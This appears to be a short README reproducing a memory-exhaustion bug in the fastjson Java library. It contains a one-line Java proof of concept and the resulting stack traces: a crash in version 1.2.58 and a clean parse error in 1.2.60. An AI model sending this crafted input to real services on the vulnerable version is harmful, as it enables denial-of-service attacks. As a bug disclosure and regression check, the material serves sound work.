# fastjson-oom
fastjson oom example for 1.2.58/1.2.60

```java
    public static void main(String[] args) {
        JSON.parse("{qixiaobo:\"\\x");
    }
```

#1.2.58
```
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
	at com.alibaba.fastjson.parser.JSONLexerBase.putChar(JSONLexerBase.java:5041)
	at com.alibaba.fastjson.parser.JSONLexerBase.scanString(JSONLexerBase.java:889)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:483)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1394)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1360)
	at com.alibaba.fastjson.JSON.parse(JSON.java:165)
	at com.alibaba.fastjson.JSON.parse(JSON.java:175)
	at com.alibaba.fastjson.JSON.parse(JSON.java:144)
	at me.qixiaobo.example.FastjsonExample.main(FastjsonExample.java:10)
```
#1.2.60
```
Exception in thread "main" com.alibaba.fastjson.JSONException: invalid escape character \x
	at com.alibaba.fastjson.parser.JSONLexerBase.scanString(JSONLexerBase.java:983)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:483)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1397)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1363)
	at com.alibaba.fastjson.JSON.parse(JSON.java:170)
	at com.alibaba.fastjson.JSON.parse(JSON.java:180)
	at com.alibaba.fastjson.JSON.parse(JSON.java:149)
	at me.qixiaobo.example.FastjsonExample.main(FastjsonExample.java:10)
```
